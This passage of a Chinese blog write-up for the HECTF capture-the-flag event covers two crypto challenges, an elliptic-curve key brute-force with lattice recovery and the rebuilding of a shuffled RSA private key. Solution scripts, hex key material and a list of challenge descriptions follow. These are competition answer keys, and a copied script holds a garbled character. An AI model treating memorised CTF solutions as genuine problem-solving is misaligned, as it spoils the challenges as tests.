<p>根据题目描述的提示可以看到题目中好几处参数不合理的地方，比如 p,q 的大小等，因为异或操作并不会把多余的部分去掉，所以密文中泄露了很多消息，但还有一个问题就是如何求 key，这时一个 ECDLP 问题，可以采用 MOV 攻击，不过既然参数不合理，也可以尝试爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line">q = <span class="number">7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line">a = <span class="number">4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line">b = <span class="number">5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line">x = <span class="number">5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403</span></span><br><span class="line">x1 = <span class="number">0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line">y1 = <span class="number">0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line">c = [<span class="number">36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820</span>, <span class="number">20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332</span>, <span class="number">19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277</span>, <span class="number">45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先求key，可以用MOV攻击，也可以直接爆破，这里直接爆破了</span></span><br><span class="line">Ep = EllipticCurve(GF(p), [a, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">G = Ep.lift_x(x)</span><br><span class="line">hint1 = Ep(x1, y1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> hint1 ==  key * G:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># key = 51517</span></span><br><span class="line"><span class="comment"># 然后求flag,可以用铜匠定理也可以构造格子</span></span><br><span class="line">n = p*q</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">Cur=EllipticCurve(Zmod(n),[a,b])</span><br><span class="line">aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover</span>(<span class="params">x,y</span>):</span><br><span class="line">    M=Matrix(ZZ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>*x*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="number">3</span>*x^<span class="number">2</span>+a)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,-<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,-<span class="number">2</span>*y*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">512</span>,(x^<span class="number">3</span>+a*x-y^<span class="number">2</span>+b)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,n*<span class="number">2</span>^<span class="number">512</span>]])</span><br><span class="line">    v=M.LLL()[-<span class="number">1</span>]</span><br><span class="line">    dx=<span class="built_in">int</span>(v[<span class="number">2</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    dy=<span class="built_in">int</span>(v[<span class="number">4</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    gx=x+dx</span><br><span class="line">    gy=y+dy</span><br><span class="line">    m.append(x^^gx)</span><br><span class="line">    m.append(y^^gy)</span><br><span class="line">recover(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">recover(c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">out=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    out+=aes.decrypt(long_to_bytes(i))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ out+ <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="情书与破碎的证书"><a class="markdownIt-Anchor" href="#情书与破碎的证书">#</a> 情书与破碎的证书</h3>
<p>首先我们需要知道证书的基本格式 在证书中必然含有 -----BEGIN PRIVATE KEY-----<br>
 这一段可以拆成<br>
 2d 2d 2d 2d 2d 42 45 47 49</p>
<p>4e 20 50 52 49 56 41 54 45</p>
<p>20 4b 45 59 2d 2d 2d 2d 2d<br>
 和已经整理好的相比<br>
 49 47 45 42 2d 2d 2d 2d 2d</p>
<p>45 54 41 56 49 52 50 20 4e</p>
<p>2d 2d 2d 2d 2d 59 45 4b 20<br>
 很容易看出 1 和 9 换 2 和 8 换 3 和 7 换 4 和 6 换</p>
<p>我们将证书整理一下 可以得</p>
<p>30 82 04 bc 02 01 00 30 0d<br>
06 09 2a 86 48 86 f7 0d 01<br>
01 01 05 00 04 82 04 a6 30<br>
82 04 a2 02 01 00 02 82 01<br>
01 00 bd db 99 13 77 8d 23<br>
15 44 9b 58 7f bd 7f 6e 41<br>
94 4d 1c 9c 54 84 c9 b0 1f<br>
bf 53 44 93 35 5c f8 84 89<br>
cb f9 63 0f 42 99 bb 4d bb<br>
84 df 7b d6 60 7b 7a 57 8f<br>
84 e4 c6 d6 a7 0f 50 6c 16<br>
a4 31 1b 15 08 e3 97 5d b7<br>
1e 71 d6 d2 d1 7d d7 5b 9c<br>
23 e2 d4 37 bc f7 f5 d9 50<br>
6e 76 3c 71 22 a5 76 fd 5c<br>
15 90 5a b4 5f eb a2 0a 24<br>
12 86 28 5b 8b a5 d6 db d1<br>
b7 d0 ce 97 5a b7 4e ae 33<br>
8f e0 dd 5a 19 4d 02 91 8e<br>
4f 0a d6 d1 60 f1 b7 30 74<br>
3f c2 c8 eb 74 db 01 08 9d<br>
21 0d 50 c5 aa 1f 25 97 93<br>
b5 12 b2 6a 8f 3e 62 cc 6a<br>
95 e9 ce f6 5e 5d 49 e9 e6<br>
6d 35 2d db b1 40 8f a9 fe<br>
5b 29 a1 64 2c 61 d2 c4 d3<br>
2c 66 c5 6d d6 fa 36 39 b2<br>
14 6b 1f 59 29 89 6a ba b4<br>
b1 ed 35 ec f5 7d d6 30 ce<br>
ca c1 5f cc 6b 74 3f 97 f0<br>
86 f2 c6 04 0e 66 e9 1e 92<br>
05 31 ba 61 2b e1 92 7b 67<br>
54 52 5e 08 e5 19 02 03 01<br>
00 01 02 82 01 00 04 62 04</p>
<p>中间被打碎了<br>
 d4 8d 90 d8 0f 02 81 80 51<br>
a5 f7 e7 f4 c0 50 a5 0e 18<br>
fd e1 2f ce e2 64 6f 2b 43<br>
16 0b 0c 75 ab 49 25 e8 26<br>
9a e8 0e 70 cf 12 73 4f 41<br>
fa b1 8d 04 24 ed 7c ce b7<br>
dd b2 7c be 0f 55 4f 7a 6e<br>
16 98 d4 ec 5b a2 b4 8d 61<br>
2e 23 37 ae b7 5f 8a 57 d8<br>
15 5a 11 d0 7b 2c 49 d3 d9<br>
7c 4f f0 cf b8 9e 6d d4 f3<br>
6c c3 7c 01 0b 5b c8 93 56<br>
a3 9b 57 6c c3 ed d0 3c dc<br>
4d 79 1d f5 09 1a 55 71 df<br>
1a 6c 15 ee da a0 77 3c f3<br>
cf 02 81 80 0f c6 1f 05 d1<br>
9c 96 ee c3 ed ca cc a3 4e<br>
1d 3e 2c ab 43 9b eb ab 66<br>
93 a3 ce 2c a9 9f 88 ab 9c<br>
dd 18 3c eb 8e 80 1d 82 98<br>
f8 35 35 98 64 ef 19 1d b3<br>
f5 32 69 97 6b a0 4b 03 60<br>
6e 54 08 59 de cd 05 80 5c<br>
4a a7 9d c6 db 22 38 06 58<br>
ea f0 bf fb a0 f4 e7 19 bc<br>
f1 b1 e0 41 69 d8 e0 cb 3a<br>
f4 d9 0b 2e 62 d7 c7 ed 30<br>
45 d4 9b 52 5c a7 15 ca 3b<br>
84 f0 7b 4e ce 27 d0 4d 17<br>
95 29 9f a1 86 cd 02 81 80<br>
25 c2 0a b2 52 9f 1e fd 3d<br>
35 34 7c 57 3b 28 2a bf d9<br>
5b 26 4c 92 f6 c4 f9 ec 8b<br>
7c 71 32 06 fb ea 18 86 88<br>
0e 29 a3 6c 47 ef 9b b7 53<br>
ce 95 67 ea 4d 3e 08 3c 30<br>
f3 44 02 2f 95 b7 cd 71 14<br>
81 3b f6 a2 8e cc 67 d5 fe<br>
05 95 32 42 68 4c d2 9c 1c<br>
5d d8 a7 44 16 89 0e 5c 94<br>
3c 70 90 4b a7 0e 34 9b 15<br>
71 9a 46 6f 90 1f bf 0c fc<br>
78 40 f8 03 2e 31 af bc cf<br>
b8 4f 4a 81 7e a5 1c 8f 90<br>
fd 6a 2d 2d 2d 2d 2d 45 4e<br>
44 20 50 52 49 56 41 54 45<br>
20 4b 45 59 2d 2d 2d 2d 2d</p>
<p>根据 rsa 证书格式 我们可以得到<br>
标识头 30</p>
<p>总长度 82 04bc</p>
<p>版本信息 0201 00300d06092a864886f70d0101010500048204a6308204a2020100</p>
<p>n 02820101 00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</p>
<p>e 0203 010001</p>
<p>d 02820100</p>
<p>046204（没用）</p>
<p>q d48d90d80f（没用）</p>
<p>dp 028180</p>
<p>51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</p>
<p>dq 028180</p>
<p>0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</p>
<p>inv(q,p) 028180</p>
<p>25c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/3be30da7583d4ebd84509ed31b1e9164.jpeg#pic_center" alt="在这里插入图片描述"></p>
<p>可以通过 openssl 进行一些了解 或者修补私钥 但不是本题的考点<br>
（上图为 openssl 中修好的秘钥 可以看到十六进制部分是相同的）</p>
<p>得到这些后 我们就可以来一个简单的 dp 泄露<br>
但是要注意，我之前提到了明文中有中文，所以我们需要使用 PKCS1_OAEP 解密器<br>
传统的解密脚本无效</p>
<p>以下是脚本</p>
<p>from Crypto.PublicKey import RSA<br>
from Crypto.Cipher import PKCS1_OAEP<br>
from Crypto.Util.number import inverse, long_to_bytes<br>
import binascii</p>
<p>hex_p = “0x00efaf90cae18eedc592a6cc57e6f4fb8812cd663274c90c0c82240b4a13c6d1772bab4f32f087cf3179f93513da0775529422f3c1ed5a0b8c2bd81bcd65a2451eab291585d1f39cc7dfc4c36ef2ff0e9be22d9252c80c7e11cd493542c27731965a5603dde878356433d07b99431eb69dc9856931583e9ced764503bded010857”<br>
hex_q = “0x00cac7cc600b5e888df3f9e905d48d088d1a15819dbde1c8501028ffe3b02bf237acb277b43eda8a2110e9b6931cbfffe6eeade466611be17454f2d0c848a567e77065e82ff4f2aa0de7bfe1e622d060f67a5f6fc87e5859ed6aec857cf8124418b4c73a40628fdddd002504444acb31fb0b4ea35068ec8c1ffb933ed48d90d80f”<br>
hex_e = “0x10001”<br>
hex_c = “0x92c8bf09c04cf0193306f9203b19956fbcbe796c6e65fdaefeb49c5fb0391c1f78552d5fb4385ba3dfd11efb23759fdc386a2336e827b0be5b3514522b8063149d584edef58f2d64b4e8d6c9e5813de1d27b4c3fe970abfb4495700ed04b496bf1eb8d90b5a836ba3d852e0038d943ce116d691ec1490750c62b1cd19a1816ade9325c9ac739255b1c24e95cc387050ff521c3f60882efe33c66409498654ed39bc6c1253c21e3e78dc67937666a2ae64826cfe4767f24a5712069ec3a31e0f36ce4ef473041f8df8e553e72771d81b6ef75a95d29172483fcc33ea9c396f98af037527d4f6bd0cbf033e1f8263aba1f1cb35fca87e119c4b953526be191ada6”</p>
<p>p = int(hex_p, 16)<br>
q = int(hex_q, 16)<br>
e = int(hex_e, 16)<br>
c = int(hex_c, 16)</p>
<p>n = p * q</p>
<p>phi_n = (p - 1) * (q - 1)</p>
<p>d = inverse(e, phi_n)</p>
<p>rsa_key = RSA.construct((n, e, d, p, q))</p>
<p># 使用 PKCS1_OAEP 初始化解密器<br>
 cipher = PKCS1_OAEP.new (rsa_key)</p>
<p># 将密文转为字节形式<br>
 ciphertext_bytes = long_to_bytes©</p>
<p>decrypted_message_bytes = cipher.decrypt(ciphertext_bytes)<br>
# 将解密后的字节数据转换为字符串，使用 UTF-8 解码<br>
 message = decrypted_message_bytes.decode (‘utf-8’)<br>
print(“Decrypted Message:”, message)</p>
<p t1an_dog_no_g3t_g00d_d1e="">Decrypted Message: 你知道么，rsa 的大数分解的坚固就像爱情一样坚不可摧，你愿意让我们也像 rsa 一样坚不可摧么？但是你并不关心结局，你只关心你的 flag:HECTF</p>
<h1 id="题目描述记录"><a class="markdownIt-Anchor" href="#题目描述记录">#</a> 题目描述记录：</h1>
<h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2">#</a> Web：</h2>
<h3 id="are-u-happy"><a class="markdownIt-Anchor" href="#are-u-happy">#</a> <strong>Are u happy</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>开始开心地玩耍吧！</p>
</blockquote>
<h3 id="baby_sql-2"><a class="markdownIt-Anchor" href="#baby_sql-2">#</a> <strong>baby_sql</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>g01den 的公司里有个记录员工打卡的后台，只有 admin 才能登陆，但是，g01den 发现，每次去公司视察的时候公司里的员工总数始终和打卡了的员工数目对不上，g01den 怀疑公司里的某位员工利用了漏洞，于是他在后台程序里增加了一些 WAF，并且他对他自己的 WAF 很自信，并暗示了那位员工他在数据库里放了一个重要的信息（flag），能拿到这个信息（flag）的人年终可以获得额外的奖金。作为那位员工的你应该如何拿到这个信息获得奖金呢？ flag 由 HECTF 开头，得到的答案请将 hectf 修改为大写 HECTF，flag 中除了开头的 HECTF 外，无大写字母</p>
</blockquote>
<h3 id="baby_unserialize-2"><a class="markdownIt-Anchor" href="#baby_unserialize-2">#</a> <strong>baby_unserialize</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>一个简单的反序列化，一个简单的 RCE</p>
</blockquote>
<h3 id="你一个人专属的进货网站-2"><a class="markdownIt-Anchor" href="#你一个人专属的进货网站-2">#</a> <strong>你一个人专属的进货网站</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>w41tm00n 第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n 终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是 w41tm00n 没学过网安的知识，写的网站存在漏洞你作为 w41tm00n 的好朋友，同时你是位网安的实习生，w41tm00n 就找到了你帮他测试网站是否存在漏洞。w41tm00n 跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag 文件）</p>
</blockquote>
<h3 id="ezweb-2"><a class="markdownIt-Anchor" href="#ezweb-2">#</a> <strong>ezweb</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>Try to be admin to get flag！！！</p>
<p><strong>提示 1</strong>Hint：xxxxx 为 c、e、f、h、t 这五个没大没小的字母</p>
</blockquote>
<h3 id="ezjava-2"><a class="markdownIt-Anchor" href="#ezjava-2">#</a> ezjava</h3>
<p>题目描述：</p>
<blockquote>
<p>A 了这道题，我就承认你是真正的奶龙</p>
</blockquote>
<h2 id="re-2"><a class="markdownIt-Anchor" href="#re-2">#</a> Re</h2>
<h3 id="babyre-2"><a class="markdownIt-Anchor" href="#babyre-2">#</a> <strong>babyre</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>g01den 最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p>
</blockquote>
<h3 id="littleasm"><a class="markdownIt-Anchor" href="#littleasm">#</a> <strong>littleasm</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>百行代码里的藏匿的 flag</p>
</blockquote>
<h3 id="pepy"><a class="markdownIt-Anchor" href="#pepy">#</a> <strong>PE?py?</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>在 pyre 里找到压缩包密码</p>
</blockquote>
<h3 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h3>
<p>题目描述：</p>
<blockquote xxxx="">
<p>flag 格式 HECTF</p>
</blockquote>
<h3 id="ezandroid"><a class="markdownIt-Anchor" href="#ezandroid">#</a> <strong>ezAndroid</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2">#</a> Pwn</h2>
<h3 id="sign-in-2"><a class="markdownIt-Anchor" href="#sign-in-2">#</a> <strong>sign in</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>快来签到吧…</p>
</blockquote>
<h3 id="find-eggy-2"><a class="markdownIt-Anchor" href="#find-eggy-2">#</a> <strong>find eggy</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h3 id="arcaea_sorting-2"><a class="markdownIt-Anchor" href="#arcaea_sorting-2">#</a> <strong>Arcaea_Sorting</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>–为何我的眼里常含泪水，因为我爱这 libc，爱得深沉  (<em><sup>▽</sup></em>)</p>
<p>听好了：</p>
<p>XX 月 XX 日，g01den 自制的查分系统正式完工，每个部署了该系统的服务器都将会迎来一场漩涡，为这些服务器带来全新的危机。</p>
<p>你所购买的服务器都将迎来黑客的试炼，你所熟悉的服务器都将加诸栈溢出的历练。</p>
<p>至此，一锤定音。</p>
<p>尘埃，已然落定。</p>
<p>#HECTF #听好了 #韵律源点</p>
</blockquote>
<h3 id="arcaea_sorting_revenge-2"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-2">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>g01den 得知他写的查分器存在漏洞，他害怕到大晚上睡不着，第二天一早火急火燎地把程序重写了，但是他突然发现他学艺不精，突然不会写链表数据结构了，于是，他将查分器改成了存储分数的存储器，希望这次不会出现安全性问题。</p>
</blockquote>
<h3 id="喵喵喵"><a class="markdownIt-Anchor" href="#喵喵喵">#</a> <strong>喵喵喵</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h3 id="lip"><a class="markdownIt-Anchor" href="#lip">#</a> <strong>lip</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2">#</a> Crypto</h2>
<h3 id="迷茫的艾米莉-2"><a class="markdownIt-Anchor" href="#迷茫的艾米莉-2">#</a> <strong>迷茫的艾米莉</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的 responsibility 是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文 Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p>
</blockquote>
<h3 id="翻一翻-2"><a class="markdownIt-Anchor" href="#翻一翻-2">#</a> <strong>翻一翻</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p>
</blockquote>
<h3 id="seven-more-2"><a class="markdownIt-Anchor" href="#seven-more-2">#</a> <strong>seven more</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>more than more no co-prime</p>
</blockquote>
<h3 id="情书与破碎的证书-2"><a class="markdownIt-Anchor" href="#情书与破碎的证书-2">#</a> <strong>情书与破碎的证书</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>小明喜欢上了小红，他使用 rsa 向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成 16 进制，以九个为一组用相同的方式打乱（转化时产生的 0d0a 换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p>
<p><strong>提示 1</strong> 情书与破碎的证书 hint1: 字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt () 解密密文（毕竟考点是证书）</p>
</blockquote>
<h3 id="不合格的魔药-2"><a class="markdownIt-Anchor" href="#不合格的魔药-2">#</a> <strong>不合格的魔药</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>刚开始学习魔药的小 A 总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息 “保密” 的效果了，请从这份面目全非的成品中还原出小 A 想隐藏的信息</p>
</blockquote>
<h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2">#</a> Misc</h2>
<h3 id="rem_you"><a class="markdownIt-Anchor" href="#rem_you">#</a> <strong>Rem_You</strong></h3>
<p>题目描述：</p>
<blockquote></blockquote>
<h3 id="funny"><a class="markdownIt-Anchor" href="#funny">#</a> <strong>funny</strong></h3>
<p>题目描述：</p>
<blockquote 省-市-广场名字-水边名字="">
<p>看了半天电脑的小明非常劳累，便摸鱼去楼下的广场逛一逛但觉得广场太吵闹了，又去了水边看大爷们钓鱼，你能找出小明去的广场和水边的名字嘛</p>
<p>flag 格式  HECTF {北京市 - 区 - 广场名字 - 水边名字}   HECTF</p>
</blockquote>
<h3 id="简单的压缩包-2"><a class="markdownIt-Anchor" href="#简单的压缩包-2">#</a> <strong>简单的压缩包</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>w41tm00n 是个 kisaki 推，某天在水群的时候，一个同为 kisaki 推的 g01den 在群里分享了个压缩包，并留言里面有一张 kisaki 的图，同时里面还存在着神秘的信息（这里是 flag），w41tm00n 对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p>
</blockquote>
<h3 id="恶势力的仓库"><a class="markdownIt-Anchor" href="#恶势力的仓库">#</a> <strong>恶势力的仓库</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p>
</blockquote>
<h3 id="恶势力的聊天记录"><a class="markdownIt-Anchor" href="#恶势力的聊天记录">#</a> <strong>恶势力的聊天记录</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>附件下载地址： 链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  提取码：o07y</p>
</blockquote>
<p>答案请将 hectf 修改为大写 HECTF，flag 中除了开头的 HECTF 外，无大写字母</p>
<h3 id="baby_unserialize-3"><a class="markdownIt-Anchor" href="#baby_unserialize-3">#</a> <strong>baby_unserialize</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>一个简单的反序列化，一个简单的 RCE</p>
</blockquote>
<h3 id="你一个人专属的进货网站-3"><a class="markdownIt-Anchor" href="#你一个人专属的进货网站-3">#</a> <strong>你一个人专属的进货网站</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>w41tm00n 第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n 终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是 w41tm00n 没学过网安的知识，写的网站存在漏洞你作为 w41tm00n 的好朋友，同时你是位网安的实习生，w41tm00n 就找到了你帮他测试网站是否存在漏洞。w41tm00n 跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag 文件）</p>
</blockquote>
<h3 id="ezweb-3"><a class="markdownIt-Anchor" href="#ezweb-3">#</a> <strong>ezweb</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>Try to be admin to get flag！！！</p>
<p><strong>提示 1</strong>Hint：xxxxx 为 c、e、f、h、t 这五个没大没小的字母</p>
</blockquote>
<h3 id="ezjava-3"><a class="markdownIt-Anchor" href="#ezjava-3">#</a> ezjava</h3>
<p>题目描述：</p>
<blockquote>
<p>A 了这道题，我就承认你是真正的奶龙</p>
</blockquote>
<h2 id="re-3"><a class="markdownIt-Anchor" href="#re-3">#</a> Re</h2>
<h3 id="babyre-3"><a class="markdownIt-Anchor" href="#babyre-3">#</a> <strong>babyre</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>g01den 最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p>
</blockquote>
<h3 id="littleasm-2"><a class="markdownIt-Anchor" href="#littleasm-2">#</a> <strong>littleasm</strong></h3>
<p>题目描述：</p>
<blockquote>
<p>百行代码里的藏匿的 flag</p>
</blockquote>
